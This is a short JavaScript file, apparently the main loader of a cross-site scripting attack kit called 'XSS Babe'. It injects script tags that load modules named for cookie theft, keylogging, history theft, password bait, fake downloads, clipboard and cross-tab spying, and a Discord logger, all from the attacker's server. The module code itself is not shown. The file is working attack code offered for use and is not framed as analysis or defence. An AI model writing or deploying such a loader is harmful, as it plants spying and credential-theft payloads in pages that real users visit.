// x.js - main loader for all modules

console.log("XSS Babe x.js loaded.");

// Load all active modules
let scripts = [
  "auto_cookie_steal.js",
  "clipboard.js",
  "cross_tab_messaging_spy.js",
  "discord_logger.js",
  "fake_download.js",
  "history_stealer.js",
  "keylogger.js",
  "password_bait.js"
];

scripts.forEach(file => {
  let s = document.createElement('script');
  // Use absolute path so modules load correctly when x.js is referenced
  // from the root of the server.
  s.src = `/static/modules/${file}`;
  document.head.appendChild(s);
});
